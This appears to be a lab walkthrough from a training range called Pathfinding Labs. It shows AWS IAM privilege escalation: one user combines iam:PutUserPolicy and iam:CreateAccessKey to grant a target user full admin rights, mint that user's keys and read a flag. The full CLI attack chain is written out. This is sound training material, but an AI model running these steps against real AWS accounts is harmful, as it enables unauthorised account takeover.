# Guided Walkthrough: One-Hop Privilege Escalation via iam:PutUserPolicy + iam:CreateAccessKey

This scenario demonstrates a compound privilege escalation vulnerability where a user has both `iam:PutUserPolicy` and `iam:CreateAccessKey` permissions on a target user. This dangerous combination allows an attacker to modify another user's permissions and then authenticate as that user.

The attack involves two critical steps: first, the attacker adds an inline policy with administrative permissions to the target user using `iam:PutUserPolicy`. Then, they create access keys for that target user using `iam:CreateAccessKey`. With these new credentials, the attacker can authenticate as the target user and gain the administrative permissions they just granted.

This represents a lateral movement privilege escalation path, where the attacker pivots from one user identity to another, more privileged identity. It's particularly dangerous because it combines policy modification with credential creation, creating a complete attack chain from limited access to full administrative control.

## The Challenge

You have obtained credentials for `pl-prod-iam-018-to-admin-starting-user`. This IAM user has two dangerous permissions scoped to another user in the same account: `iam:PutUserPolicy` and `iam:CreateAccessKey`, both targeting `pl-prod-iam-018-to-admin-target-user`.

The target user currently has minimal permissions — they can't do much on their own. Your goal is to reach full administrative access by chaining these two permissions together.

## Reconnaissance

First, let's confirm who we are and what we're working with.

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::{account_id}:user/pl-prod-iam-018-to-admin-starting-user
```

Verify that the starting user can't do anything privileged yet — trying to list IAM users should fail:

```bash
aws iam list-users --max-items 1
# An error occurred (AccessDenied) ...
```

Now check the target user to understand their current state:

```bash
aws iam get-user --user-name pl-prod-iam-018-to-admin-target-user \
  --query 'User.[UserName,Arn]' --output table

aws iam list-user-policies --user-name pl-prod-iam-018-to-admin-target-user \
  --query 'PolicyNames' --output text
# (empty — no inline policies yet)
```

Good. The target user exists and currently has no inline policies. That's our opening.

## Exploitation

### Step 1: Modify the Target User's Permissions

Using `iam:PutUserPolicy`, we add an inline policy that grants `AdministratorAccess` (allow all actions on all resources) to the target user:

```bash
cat > /tmp/admin-escalation-policy.json <<EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }
  ]
}
EOF

aws iam put-user-policy \
  --user-name pl-prod-iam-018-to-admin-target-user \
  --policy-name admin-escalation \
  --policy-document file:///tmp/admin-escalation-policy.json
```

The target user now has an inline policy granting them administrator access — but we still can't act as them. We need credentials.

Wait 15 seconds for IAM policy propagation before proceeding.

### Step 2: Create Access Keys for the Target User

Using `iam:CreateAccessKey` on the target user, we generate a new set of long-term credentials:

```bash
aws iam create-access-key --user-name pl-prod-iam-018-to-admin-target-user --output json
```

The response contains `AccessKeyId` and `SecretAccessKey`. Save these — they are the credentials for the newly-elevated target user.

### Step 3: Authenticate as the Target User

Switch your AWS CLI environment to use the target user's new credentials:

```bash
export AWS_ACCESS_KEY_ID="<NewAccessKeyId>"
export AWS_SECRET_ACCESS_KEY="<NewSecretAccessKey>"
unset AWS_SESSION_TOKEN
```

Wait 15 seconds for the new access keys to initialize.

## Verification

Now verify that we're operating as the target user and that we have admin access:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::{account_id}:user/pl-prod-iam-018-to-admin-target-user

aws iam list-users --max-items 3 --output table
# Successfully lists IAM users — admin access confirmed
```

## Capture the Flag

Admin access isn't the finish line — the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` inline policy you attached to the target user provides implicitly.

Using the target user credentials (which, thanks to the previous step, hold the inline admin policy), read the flag:

```bash
aws ssm get-parameter \
    --name /pathfinding-labs/flags/iam-018-to-admin \
    --query 'Parameter.Value' \
    --output text
# flag{...}  — your scenario-specific flag value
```

The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario, so this same command works as the final step for any of them — only the scenario ID in the path changes.

## What Happened

You started as a limited IAM user with no admin capabilities. By exploiting `iam:PutUserPolicy`, you were able to grant arbitrary permissions to another user in the same account. Then, using `iam:CreateAccessKey`, you minted credentials for that newly-elevated user and switched your identity to theirs.

This is a classic lateral movement + privilege escalation chain. In real environments, this pattern often appears when a developer or service account is given broad IAM management permissions "for convenience" without understanding that the ability to modify another user's policies is equivalent to granting yourself admin access. The two permissions together — write policy, create credentials — form a complete one-hop path to administrator.

Cleanup: run `plabs cleanup iam-018-iam-putuserpolicy+iam-createaccesskey` (or `./cleanup_attack.sh`) to remove the inline policy and the access keys created during this walkthrough.
